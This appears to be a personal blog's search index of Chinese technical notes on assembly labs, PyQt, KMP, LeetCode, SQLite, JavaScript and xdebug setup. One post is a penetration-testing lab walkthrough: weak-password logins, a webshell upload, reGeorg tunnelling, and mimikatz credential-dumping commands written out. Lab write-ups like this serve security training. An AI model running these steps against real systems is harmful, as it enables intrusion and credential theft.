<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>汇编从入门到入土八</title>
      <link href="/posts/90d750b6/"/>
      <url>/posts/90d750b6/</url>
      
        <content type="html"><![CDATA[<h2 id="中断处理的流程-牢记"><a href="#中断处理的流程-牢记" class="headerlink" title="中断处理的流程(牢记)"></a>中断处理的流程(牢记)</h2><p><img src="/posts/90d750b6/clipboard.png" alt></p><p>关于第三步</p><p>为什么要设置第8位 TF？</p><p>这就涉及到debug程序的原理：</p><blockquote><p>debug的原理，通过设置 TF 为1，引发单步中断去执行debug准备好的中断代码</p><p><img src="/posts/90d750b6/1588129690345.png" alt></p></blockquote><p>但是这样会有问题，在处理中断的时候是不能去触发单步中断的，所以CPU要提前设置TF为0</p><p>中断过程具体的操作</p><p><img src="/posts/90d750b6/1588129813844.png" alt></p><h2 id="lab12"><a href="#lab12" class="headerlink" title="lab12"></a>lab12</h2><p>代码如下：</p><pre><code class="asm">assume cs:codecode segmentstart:    mov ax,cs    mov ds,ax    mov si,offset do0    mov ax,0    mov es,ax    mov di,200H    mov cx,offset do0end-offset do0    rep movsb    mov ax,0    mov es,ax    mov word ptr es:[0],200H    mov word ptr es:[2],0    mov ax, 1000h    mov bh, 1    div bh    mov ax,4C00H    int 21Hdo0:    jmp short do0start    db &quot;divide error!&quot;do0start:    mov ax,cs    mov ds,ax    mov si,202H    mov ax,0B800H    mov es,ax    mov di,12*160+33*2;这里要注意一下，不能因为字符串长度为13，为了居中输出就设置成12*160+67，会出现意想不到的情况    mov cx,13    s:    mov al,[si]    mov es:[di],al    inc si    add di,2    loop s    mov ax,4C00H    int 21Hdo0end:nopcode endsend start</code></pre><p>通过 <code>offset</code> 获得偏移地址</p><p>通过 <code>rep movsb</code> 来拷贝 do0 程序</p><blockquote><p>这里特别注意，do0 要使用的字符串必须存储在 do0 子程序中，并且需要手动计算一下字符串的位置</p></blockquote><p>当然最后还需要来触发这个中断</p><pre><code class="asm">    mov ax, 1000h    mov bh, 1    div bh</code></pre><p>如果直接存放原来data中的位置</p><pre><code class="asm">assume cs:codedata segmentdb &quot;overflow!&quot;data endscode segmentstart:    mov ax,cs    mov ds,ax    mov si,offset do0    mov ax,0    mov es,ax    mov di,200H    mov cx,offset do0end-offset do0    rep movsb    mov ax,0    mov es,ax    mov word ptr es:[0],200H    mov word ptr es:[2],0    mov ax, 1000h    mov bh, 1    div bh    mov ax,4C00H    int 21Hdo0:    mov ax,data    mov ds,ax    mov si,0    mov ax,0B800H    mov es,ax    mov di,12*160+33*2    mov cx,13    s:    mov al,[si]    mov es:[di],al    inc si    add di,2    loop s    mov ax,4C00H    int 21Hdo0end:nopcode endsend start</code></pre><p>也是可以执行的</p><p><img src="/posts/90d750b6/1588131368497.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>企业环境渗透一</title>
      <link href="/posts/c7cfd527/"/>
      <url>/posts/c7cfd527/</url>
      
        <content type="html"><![CDATA[<h2 id="任务一-后台文件上传"><a href="#任务一-后台文件上传" class="headerlink" title="任务一 后台文件上传"></a>任务一 后台文件上传</h2><p>本实验任务基于真实企业网络环境，在三台服务器搭建的典型企业局域网环境中，主要完成以下内容：</p><p>1.1 使用目录扫描工具对目标网站的后台地址进行扫描(如wwwscan)</p><p>1.2 使用Burpsuite工具爆破后台管理员密码</p><p>1.3 使用爆破出的管理员密码登录后台，并上传一句话木马</p><p>1.4 使用中国菜刀连接一句话木马</p><p><img src="/posts/c7cfd527/1588072738413.png" alt></p><p>得到后台登陆地址为 <code>manager/login.php</code></p><p>同时发现扫描出了 <code>/myadmin</code> ，猜测是 <code>phpmyadmin</code></p><p><img src="/posts/c7cfd527/1588073088324.png" alt></p><p>弱口令 root ， root试一下，成功登陆</p><p>在数据库中发现了用户名和密码</p><p><img src="/posts/c7cfd527/1588073175463.png" alt></p><p>md5解密：</p><p><img src="/posts/c7cfd527/1588073186989.png" alt></p><p>成功登陆后台，得到 falg1</p><p><img src="/posts/c7cfd527/1588073231030.png" alt></p><h2 id="任务二-sql注入"><a href="#任务二-sql注入" class="headerlink" title="任务二 sql注入"></a>任务二 sql注入</h2><ol><li>利用之前扫描目录得到的结果访问到测试的sql，利用SQL注入漏洞获得网站数据库信息</li><li>构造SQL注入语句读取webserver配置文件查看网站根目录，写入php一句话木马，获得webshell</li></ol><p>访问存在SQL注入漏洞的页面，表的字段为10</p><p><img src="/posts/c7cfd527/1588073668068.png" alt></p><p><img src="/posts/c7cfd527/1588073693517.png" alt></p><p>尝试联合注入失败</p><p><img src="/posts/c7cfd527/1588074070981.png" alt></p><p>可以直接登陆后台，并修改配置：</p><p><img src="/posts/c7cfd527/1588074131115.png" alt></p><p>然后就可以从后台上传php文件了</p><p><img src="/posts/c7cfd527/1588074182455.png" alt></p><p>成功上传</p><p><img src="/posts/c7cfd527/1588074223735.png" alt></p><p>使用菜刀进行连接</p><p><img src="/posts/c7cfd527/1588074257325.png" alt></p><p>flag</p><p><img src="/posts/c7cfd527/1588074320768.png" alt></p><h2 id="任务三-phpmyadmin-写shell"><a href="#任务三-phpmyadmin-写shell" class="headerlink" title="任务三 phpmyadmin 写shell"></a>任务三 phpmyadmin 写shell</h2><ol><li>用之前扫描目录的结果访问phpmyadmin页面，利用弱口令登录到 <code>phpmyadmin</code> 服务中</li><li>构造SQL语句读取webserver配置文件查看网站根目录，写入php一句话木马，获得webshell</li></ol><p>弱口令登录 phpmyadmin，访问到flag表得到flag</p><p><img src="/posts/c7cfd527/1588074309330.png" alt></p><h2 id="任务四-扫描PC端并登陆"><a href="#任务四-扫描PC端并登陆" class="headerlink" title="任务四 扫描PC端并登陆"></a>任务四 扫描PC端并登陆</h2><ol><li>利用已经获取到权限的web机器，上传扫描脚本对内网中的其他主机进行扫描</li><li>利用web代理工具代理访问内网的主机，使用之前数据库中获得的账号密码进行登录</li></ol><p>上传 <code>RAScan.py</code>，扫描</p><p><img src="/posts/c7cfd527/1588121789196.png" alt></p><p>扫描结果</p><p><img src="/posts/c7cfd527/1588121802724.png" alt></p><p>可以看到 192.168.2.11 和 192.168.2.10 都开放了3389端口</p><p>上传 <code>tunnel.nosocket.php</code>，访问：</p><p><img src="/posts/c7cfd527/1588121885782.png" alt></p><p>然后使用 <code>reGeorgSocksProxy.py</code> 开启代理</p><p><img src="/posts/c7cfd527/1588121921831.png" alt></p><p>打开 <code>Proxifier</code>，新建连接</p><p><img src="/posts/c7cfd527/1588121958945.png" alt></p><p>然后设置规则：</p><p><img src="/posts/c7cfd527/1588121982402.png" alt></p><p>远程登陆 192.168.2.11</p><p><img src="/posts/c7cfd527/1588122014576.png" alt></p><p>回过头来看数据库，密码是 <code>topsec.123</code></p><p><img src="/posts/c7cfd527/1588121697982.png" alt></p><p>成功连接</p><p><img src="/posts/c7cfd527/1588122024967.png" alt></p><p>flag在C盘根目录</p><p><img src="/posts/c7cfd527/1588122036042.png" alt></p><h2 id="任务五-抓取域控密码并登陆域控"><a href="#任务五-抓取域控密码并登陆域控" class="headerlink" title="任务五 抓取域控密码并登陆域控"></a>任务五 抓取域控密码并登陆域控</h2><ol><li>利用已经登陆到远程桌面的机器，上传mimikatz工具抓取机器内存中的密码</li><li>利用抓取到的密码登陆到另一台机器2.10中</li></ol><p>上传 <code>mimikatz</code> 到 192.168.2.11 的桌面</p><p>以管理员身份运行，输入</p><pre><code>privilege::debugsekurlsa::logonpasswords</code></pre><p>得到密码</p><p><img src="/posts/c7cfd527/1588122108804.png" alt></p><p>远程登陆 192.168.2.10</p><p>flag在C盘根目录</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>端口转发</title>
      <link href="/posts/c0e91c93/"/>
      <url>/posts/c0e91c93/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>pyqt入门</title>
      <link href="/posts/341a7d9a/"/>
      <url>/posts/341a7d9a/</url>
      
        <content type="html"><![CDATA[<p>编写一个简单地GUI应用如下</p><p><img src="/posts/341a7d9a/1587693985383.png" alt></p><p>拖动进度条，下面两个框框会显示不同的数据</p><p>输入姓名，点击设置姓名，下面的框框回回显数据</p><p>点击关闭按钮关闭窗口</p><h2 id="GUI设计"><a href="#GUI设计" class="headerlink" title="GUI设计"></a>GUI设计</h2><p>妥妥拽拽即可</p><p><img src="/posts/341a7d9a/1587694105991.png" alt></p><p>两个 <code>groupbox</code> 布局可以通过</p><p><img src="/posts/341a7d9a/1587694167654.png" alt></p><p>进行设置</p><h2 id="信号和槽"><a href="#信号和槽" class="headerlink" title="信号和槽"></a>信号和槽</h2><p>关闭按钮的信号直接通过拖动即可关联</p><h3 id="自定义信号"><a href="#自定义信号" class="headerlink" title="自定义信号"></a>自定义信号</h3><pre><code class="python">import sysfrom PyQt5.QtCore import QObject,pyqtSlot,pyqtSignalclass human(QObject):    nameChanged = pyqtSignal(str)    ageChanged = pyqtSignal([int], [str])    def __init__(self, name=&quot;Mike&quot;, age=10,parent=None):        super().__init__(parent)    def setAge(self, age):        self._age = age        self.ageChanged.emit(self._age)        if age&lt;=18:            ageInfo=&quot;你是 少年&quot;        elif (18&lt; age &lt;=35):            ageInfo=&quot;你是 年轻人&quot;        elif (35&lt; age &lt;=55):            ageInfo=&quot;你是 中年人&quot;        elif (55&lt; age &lt;=80):            ageInfo=&quot;您是 老人&quot;        else:            ageInfo=&quot;您是 寿星啊&quot;        self.ageChanged[str].emit(ageInfo)    def setName(self, name):        self._name = name        self.nameChanged.emit(self._name)</code></pre><p>自定义两个信号 <code>nameChanged</code> 和 <code>ageChanged</code></p><p>自定义槽函数</p><pre><code class="python">class MyWidget(QWidget):    def __init__(self,parent=None):        super().__init__(parent=parent)        self._ui = Ui_Widget()        self._ui.setupUi(self)        self.body = human(&quot;Mike&quot;, 20)        self.body.nameChanged.connect(self.do_nameChanged)        self.body.ageChanged.connect(self.do_ageChanged_int)        self.body.ageChanged[str].connect(self.do_ageChanged_str)    def on_horizontalSlider_valueChanged(self,value):        self.body.setAge(value)        pass    def on_pushButton_clicked(self):        &#39;&#39;&#39;        当按钮点击时候自动触发该槽函数        从输入框中获取到输入的姓名，接着调用body的setName方法，setName方法会放出一个信号，由于之前设置的连接，直接触发do_nameChanged槽函数        &#39;&#39;&#39;            hisName = self._ui.lineEdit_5.text()        self.body.setName(hisName)        pass    # 自定义的槽函数    def do_nameChanged(self,name):        self._ui.editNameHello.setText(&quot;Hello&quot;+name)        pass    def do_ageChanged_int(self,age):        self._ui.editAgeStr.setText(str(age))        pass    @pyqtSlot(str)    def do_ageChanged_str(self,ageInfo):        self._ui.editAgeInt.setText(ageInfo)        pass</code></pre>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> Qt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python实现KMP算法</title>
      <link href="/posts/9bd3a30d/"/>
      <url>/posts/9bd3a30d/</url>
      
        <content type="html"><![CDATA[<p>学习完KMP算法才发现编程如此的奇妙</p><h2 id="求next数组"><a href="#求next数组" class="headerlink" title="求next数组"></a>求next数组</h2><pre><code class="python">def getNext(s):    &#39;&#39;&#39;    计算字符串的next数组    &#39;&#39;&#39;    length = len(s)    next = [0 for i in range(length)]    next[0] = -1    k = -1    j = 0    while j &lt; length-1:        # 这个 or 逻辑写的np        if k == -1 or s[j] == s[k]:            j += 1            k += 1            next[j] = k        else:            k = next[k]    return next</code></pre><p>从这张图可以看到整个的匹配过程，如果 $p_{k}$ 和 $p_{j}$ 匹配不上，那么就去看 $p_{next[k]}$ 和 $p_{j}$</p><p><img src="/posts/9bd3a30d/20150812214857858.png" alt></p><p>比如</p><pre><code>p = &quot;ABCDABD&quot;</code></pre><p>得到的结果就是</p><pre><code>[-1, 0, 0, 0, 0, 1, 2]</code></pre><p>细节感觉还是要靠自己体会</p><h2 id="KMP算法"><a href="#KMP算法" class="headerlink" title="KMP算法"></a>KMP算法</h2><pre><code class="python">def KMP(s,p):    next = getNext(p)    m,n = 0,0    while m &lt; len(s) and n &lt; len(p):        if n == -1 or p[n] == s[m]:            n += 1            m += 1        else:            n = next[n]    if n == len(p):        return True    else:        return False</code></pre><p>从头开始匹配即可，遇到匹配不上的情况就返回到 <code>next[k]</code></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/v_JULY_v/article/details/7041827" target="_blank" rel="noopener">https://blog.csdn.net/v_JULY_v/article/details/7041827</a></p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KMP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编从入门到入土七</title>
      <link href="/posts/ce48dac5/"/>
      <url>/posts/ce48dac5/</url>
      
        <content type="html"><![CDATA[<pre><code>sub al,al ZF=1,PF=1,SFmov al,1  ZF=0,PF=0,SFpush axpop bxadd al,bl add al,10mul al</code></pre><h2 id="实验十"><a href="#实验十" class="headerlink" title="实验十"></a>实验十</h2><h3 id="打印字符"><a href="#打印字符" class="headerlink" title="打印字符"></a>打印字符</h3><blockquote><p>这里的重点是不知道字符串的长度，但是知道字符串十以0结尾的，所以利用 cx = 0 jcxz 会跳转，不断地置ch=0，当取到的字符cl=0时即可跳转</p></blockquote><pre><code class="asm">assume cs:codedata segment    db &#39;Welcome to masm!&#39;, 0data endscode segmentstart:    mov dh,8 ;dh表示行号    mov dl,3 ;dl表示列号    mov cl,2 ;cl表示颜色    mov ax,data    mov ds,ax    mov si,0 ;字符串开始的位置    call show_str    mov ax,4c00h    int 21hshow_str:    mov ax,0b800h    mov es,ax ;显存段    mov di,0    mov ax, 160    mul dh    add di,ax     mov al,2    mul dl    add di,ax ;计算开始的位置    mov bl,cl ;保存颜色，因为cx要用来计数s:    mov cl, ds:[si] ;取出字符    mov ch,0 ;当cl=0的时候,cx也等于0，此时执行jcxz    jcxz ok    mov es:[di], cl    mov es:[di+1], bl    add di,2    inc si    loop sok: retcode endsend start</code></pre><h3 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h3><pre><code class="asm">assume cs:codedata segment    db 10 dup(0)data endscode segmentstart:    mov ax,12666    mov bx,data    mov ds,bx    mov si,0    call dtoc    mov dh,8    mov dl,3    mov cl,2    call show_str    mov ax,4c00h    int 21hdtoc: mov si,9           s0: mov cx,10       mov dx,00 ;dx存放余数       div cx       add dx,30H              mov [si],dl       mov cx,ax ;判断商是否为0       jcxz rt               dec si       inc cx  ;防止cx=1的时候意外退出循环       loop s0rt: retshow_str:    mov ax,0b800h    mov es,ax ;显存段    mov di,0    mov ax, 160    mul dh    add di,ax     mov al,2    mul dl    add di,ax ;计算开始的位置    mov bl,cl ;保存颜色，因为cx要用来计数s:    mov cl, ds:[si] ;取出字符    mov ch,0 ;当cl=0的时候,cx也等于0，此时执行jcxz    jcxz ok    mov es:[di], cl    mov es:[di+1], bl    add di,2    inc si    loop sok: retcode endsend start</code></pre>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>js学习笔记</title>
      <link href="/posts/ff9e87b6/"/>
      <url>/posts/ff9e87b6/</url>
      
        <content type="html"><![CDATA[<h2 id="Object对象"><a href="#Object对象" class="headerlink" title="Object对象"></a>Object对象</h2><h3 id="静态方法"><a href="#静态方法" class="headerlink" title="静态方法"></a>静态方法</h3><p>Object.keys()，Object.getOwnPropertyNames()</p><p>可以用来遍历对象的属性</p><pre><code class="js">var obj1 = {    &quot;name&quot;:&quot;pxy&quot;,    &quot;age&quot;:12}//undefinedObject.getOwnPropertyNames(obj1)//(2) [&quot;name&quot;, &quot;age&quot;]</code></pre><h3 id="实例方法"><a href="#实例方法" class="headerlink" title="实例方法"></a>实例方法</h3><p>Object.protype上定义的方法就是实例方法，能够被Object的实例调用</p><pre><code class="js">Object.getOwnPropertyNames(Object.prototype)(12) [&quot;constructor&quot;, &quot;__defineGetter__&quot;, &quot;__defineSetter__&quot;, &quot;hasOwnProperty&quot;, &quot;__lookupGetter__&quot;, &quot;__lookupSetter__&quot;, &quot;isPrototypeOf&quot;, &quot;propertyIsEnumerable&quot;, &quot;toString&quot;, &quot;valueOf&quot;, &quot;__proto__&quot;, &quot;toLocaleString&quot;]0: &quot;constructor&quot;1: &quot;__defineGetter__&quot;2: &quot;__defineSetter__&quot;3: &quot;hasOwnProperty&quot;4: &quot;__lookupGetter__&quot;5: &quot;__lookupSetter__&quot;6: &quot;isPrototypeOf&quot;7: &quot;propertyIsEnumerable&quot;8: &quot;toString&quot;9: &quot;valueOf&quot;10: &quot;__proto__&quot;11: &quot;toLocaleString&quot;length: 12__proto__: Array(0)</code></pre><p>这些方法是所有对象都公有的</p><h3 id="valueOf-NaN"><a href="#valueOf-NaN" class="headerlink" title="valueOf"></a>valueOf</h3><p><code>valueOf</code>方法的作用是返回一个对象的“值”，默认情况下返回对象本身。</p><pre><code class="js">var obj = new Object();obj.valueOf() === obj // true</code></pre><p>但是这种情况除外：</p><pre><code>var a = new Object(1)a.valueOf() === a // false</code></pre><p><code>valueOf</code>方法的主要用途是，JavaScript 自动类型转换时会默认调用这个方法</p><pre><code class="js">var obj = new Object();1 + obj //&quot;1[object Object]&quot;</code></pre><p>可以重写 <code>valueOf</code> 方法</p><pre><code class="js">obj.valueOf = function(){    return 2;}1+obj//3</code></pre><p>这个很好理解，因为obj查找 <code>valueOf</code> 函数，会先从自己的属性开始找，找不到就通过 <code>__proto__</code> 找上层对象的<code>valueOf</code> 属性</p><h2 id="编码风格"><a href="#编码风格" class="headerlink" title="编码风格"></a>编码风格</h2><h3 id="switch-case-结构"><a href="#switch-case-结构" class="headerlink" title="switch case 结构"></a>switch case 结构</h3><p>不推荐如下的方式</p><pre><code class="js">function doAction(action) {  switch (action) {    case &#39;hack&#39;:      return &#39;hack&#39;;    case &#39;slash&#39;:      return &#39;slash&#39;;    case &#39;run&#39;:      return &#39;run&#39;;    default:      throw new Error(&#39;Invalid action.&#39;);  }}</code></pre><p>推荐使用对象的方式</p><pre><code class="js">function doAction(action) {  var actions = {    &#39;hack&#39;: function () {      return &#39;hack&#39;;    },    &#39;slash&#39;: function () {      return &#39;slash&#39;;    },    &#39;run&#39;: function () {      return &#39;run&#39;;    }  };  if (typeof actions[action] !== &#39;function&#39;) {    throw new Error(&#39;Invalid action.&#39;);  }  return actions[action]();}</code></pre><p>更加简洁</p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>go相关笔记</title>
      <link href="/posts/e0759275/"/>
      <url>/posts/e0759275/</url>
      
        <content type="html"><![CDATA[<h2 id="go相关命令"><a href="#go相关命令" class="headerlink" title="go相关命令"></a>go相关命令</h2><h3 id="go-env"><a href="#go-env" class="headerlink" title="go env"></a>go env</h3><pre><code>go env -w GOPROXY=https://goproxy.io,direct# Set environment variable allow bypassing the proxy for selected modulesgo env -w GOPRIVATE=*.corp.example.comgo env -w GO111MODULE=on</code></pre>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>每天一道leetcode-560和为k的子数组</title>
      <link href="/posts/eb2e19c0/"/>
      <url>/posts/eb2e19c0/</url>
      
        <content type="html"><![CDATA[<p>给定一个整数数组和一个整数 k，你需要找到该数组中和为 k 的连续的子数组的个数。</p><p>示例 1 :</p><pre><code>输入:nums = [1,1,1], k = 2输出: 2 , [1,1] 与 [1,1] 为两种不同的情况。</code></pre><h2 id="法一——暴力"><a href="#法一——暴力" class="headerlink" title="法一——暴力"></a>法一——暴力</h2><p>两重循环，对每一个数字，从它开始往后，不断地累加，然后和k进行对比，这应该是最简单的想法了，但是我做这种题还是有点晕</p><pre><code class="python">def subarraySum(nums, k):    length = len(nums)    count = 0    for i in range(length):        sum = 0        for j in range(i, length):            sum += nums[j]            if sum == k:                count += 1    return count</code></pre><h2 id="法二——hashtables"><a href="#法二——hashtables" class="headerlink" title="法二——hashtables"></a>法二——hashtables</h2><p>思路就是不断地求和，然后判断 <code>cur_sum - k</code> 是否已经计算过了</p><blockquote><p>将前缀和放入哈希表，哈希表的设计为：key是前缀和，value是前缀和出现的次数。<br>如果当前要存入的前缀和sum，使得(sum - k)也在哈希表中时，则使用count累加哈希表中(sum - k)出现的次数，然后再将该sum放入哈希表中。这里的count与sum的添加次序不能调换，主要是为了处理k为0的情况。</p></blockquote><pre><code class="python">def subarraySum(self, nums, k):    result, cur_sum = 0, 0    sum_dict = {0:1}    for num in nums:        cur_sum += num        if cur_sum - k in sum_dict:            result += sum_dict[cur_sum - k]        sum_dict[cur_sum] = sum_dict.get(cur_sum, 0) + 1    return result</code></pre><p>go实现的代码</p><pre><code class="go">func subarraySum(nums []int, k int) int {    count := 0    sumMap := map[int]int{0:1,}    sum := 0    for _, num := range nums {        sum += num        if sumMap[sum - k] &gt; 0 {            count += sumMap[sum - k]        }        sumMap[sum]++    }    return count}</code></pre>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlite数据库笔记</title>
      <link href="/posts/532a05c/"/>
      <url>/posts/532a05c/</url>
      
        <content type="html"><![CDATA[<h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><p><code>.quit</code> 退出</p><p><code>.tables</code> 列出所有的表</p><p><code>.schema</code> 查看构建表的sql语句</p><p><code>.database</code> 查看数据库</p><h2 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h2><p>只需要 <code>sqlite</code> 加上数据库名即可</p><h2 id="创建表"><a href="#创建表" class="headerlink" title="创建表"></a>创建表</h2><pre><code>CREATE TABLE user(ID INT NOT NULL PRIMARY KEY,name TEXT ,age TEXT,password TEXT);</code></pre><p><strong>sqlite不支持修改表已经存在的字段</strong>，只能把原有的表重命名一下再创建一个</p><pre><code>alter table user rename to `user_123`;</code></pre><p>如果主键要求自动递增</p><pre><code class="sql">CREATE TABLE user(ID INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,name TEXT,password TEXT);</code></pre><h2 id="插入数据"><a href="#插入数据" class="headerlink" title="插入数据"></a>插入数据</h2><pre><code>insert into user(name,password) values(&quot;pxy&quot;, &#39;123456&#39;);</code></pre><h2 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h2><pre><code class="sql">sqlite&gt; select * from user;1|pxy|123456</code></pre>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqlit </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu配置vscode+xdebug</title>
      <link href="/posts/38fc34e6/"/>
      <url>/posts/38fc34e6/</url>
      
        <content type="html"><![CDATA[<h2 id="vscode安装"><a href="#vscode安装" class="headerlink" title="vscode安装"></a>vscode安装</h2><p>直接去官网下载deb包，然后双击即可完成安装</p><p>加两个配置选项</p><pre><code>    &quot;editor.mouseWheelZoom&quot;: true,    &quot;php.validate.executablePath&quot;: &quot;/usr/bin/php&quot;</code></pre><p>第一个是直接用滚轮缩放大小，并且图标的大小不变，第二个是配置php的路径</p><p>之后安装一些插件就不说了</p><h2 id="apache环境"><a href="#apache环境" class="headerlink" title="apache环境"></a>apache环境</h2><p>直接安装</p><pre><code>sudo apt install apache2</code></pre><p>然后安装php模块</p><pre><code>sudo apt-get install libapache2-mod-php</code></pre><p>之后，修改一下html目录的用户和组</p><pre><code>chown pxy html/ -Rchgrp pxy html/ -R</code></pre><h2 id="xdebug"><a href="#xdebug" class="headerlink" title="xdebug"></a>xdebug</h2><pre><code>php -i &gt; a.txt</code></pre><p>然后将 a.txt 的内容拷贝到</p><p><a href="https://xdebug.org/wizard" target="_blank" rel="noopener">https://xdebug.org/wizard</a></p><p>自动帮你分析phpinfo的内容(不过现在只支持php7了)</p><ol><li><p>Download <a href="http://xdebug.org/files/xdebug-2.9.4.tgz" target="_blank" rel="noopener">xdebug-2.9.4.tgz</a></p></li><li><p>Install the pre-requisites for compiling PHP extensions.<br>On your Ubuntu system, install them with: <code>apt-get install php-dev autoconf automake</code></p></li><li><p>Unpack the downloaded file with <code>tar -xvzf xdebug-2.9.4.tgz</code></p></li><li><p>Run: <code>cd xdebug-2.9.4</code></p></li><li><p>Run: <code>phpize</code> (See the <a href="https://xdebug.org/docs/faq#phpize" target="_blank" rel="noopener">FAQ</a> if you don’t have <code>phpize</code>).</p><p>As part of its output it should show:</p><pre><code>Configuring for:...Zend Module Api No:      20170718Zend Extension Api No:   320170718</code></pre></li></ol><p>   If it does not, you are using the wrong <code>phpize</code>. Please follow <a href="https://xdebug.org/docs/faq#custom-phpize" target="_blank" rel="noopener">this FAQ entry</a> and skip the next step.</p><ol start="6"><li><p>Run: <code>./configure</code></p></li><li><p>Run: <code>make</code></p></li><li><p>Run: <code>cp modules/xdebug.so /usr/lib/php/20170718</code></p></li><li><p>Update <code>/etc/php/7.2/cli/php.ini</code> and change the line<br><code>zend_extension = /usr/lib/php/20170718/xdebug.so</code></p></li><li><p>Please also update <code>php.ini</code> files in adjacent directories, as your system seems to be configured with a separate <code>php.ini</code> file for the web server and command line.</p></li></ol><p>重点是后面几个步骤：</p><ol><li><p><code>cp modules/xdebug.so /usr/lib/php/20170718</code></p></li><li><p>修改 <code>/etc/php/7.2/cli/php.ini</code> 文件内容，加上</p><pre><code>zend_extension = /usr/lib/php/20170718/xdebug.so</code></pre></li><li><p>然后还需要修改  <code>/etc/php/7.2/apache2</code> 目录下的 php.ini 这个才是web的</p></li></ol><p>如图， <code>cli</code> 目录是命令行， <code>apache2</code> 才是web的</p><p><img src="/posts/38fc34e6/1587378336782.png" alt></p><ol start="4"><li>之后还需要修改 <code>mods-available</code> 目录下的文件</li></ol><pre><code>pxy@pxy-VirtualBox:/etc/php/7.2/mods-available$ cat xdebug.ini ;zend_extension=xdebug.soxdebug.remote_enable = 1xdebug.remote_port = 9000;xdebug.idekey = PHPSTORMxdebug.remote_host=localhostxdebug.remote_autostart = 1xdebug.show_error_trace = 1</code></pre><ol start="5"><li>最后需要在web和cli下的 <code>conf.d</code> 中做一次软链接</li></ol><p><img src="/posts/38fc34e6/1587378447111.png" alt></p><p>至此xdebug+vscode就配置好了</p><p><img src="/posts/38fc34e6/1587378474835.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> vscode </tag>
            
            <tag> xdebug </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编从入门到入土六</title>
      <link href="/posts/79b4f583/"/>
      <url>/posts/79b4f583/</url>
      
        <content type="html"><![CDATA[<h2 id="mul和div"><a href="#mul和div" class="headerlink" title="mul和div"></a>mul和div</h2><p><strong>mul指令</strong></p><ol><li>两个相乘的数，如果都为8位，其中一个默认存放在AL，另一个放在8位寄存器或者内存字节单元中，结果是16位的，默认存放在AX中</li><li>两个相乘的数，如果都为16位，其中一个默认存放在AX，另一个放在16位寄存器或者内存字单元中，结果是32位的，高位默认存放在DX中，低位存放在AX中</li></ol><p><strong>div指令</strong></p><ol><li>除数有8位和16位，存放在reg或者内存单元</li><li>除数为8位，被除数为16位，被除数默认存放在AX中。除数为16位，被除数为32位，被除数高位存放在DX中，低位存放在AX中</li><li>结果，除数为8位，商存储在AL，余数存储在AH。除数为16位，商存储在AX，余数存储在DX</li></ol><h2 id="实验九-打印"><a href="#实验九-打印" class="headerlink" title="实验九 打印"></a>实验九 打印</h2><p>打印helloworld</p><p>尤其要注意 <code>mov al, [bp]</code>，这里是取出</p><pre><code class="asm">assume cs:codedata segment    db &#39;Hello World&#39;    db 24h    dw 1824 data endscode segmentstart:    mov ax,data    mov ds,ax    mov ax, 0b800h    mov es, ax    mov si,0    mov di,0    mov bx, ds:[12]    mov bp, ds:[11]    mov cx, 11s:    mov al, ds:[si]    mov es:[bx+di], al    mov al, [bp]    mov es:[bx+di+1], al    inc si    add di,2    loop s    mov ax,4c00h    int 21hcode endsend start</code></pre>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>春招面经汇总</title>
      <link href="/posts/ddd168ac/"/>
      <url>/posts/ddd168ac/</url>
      
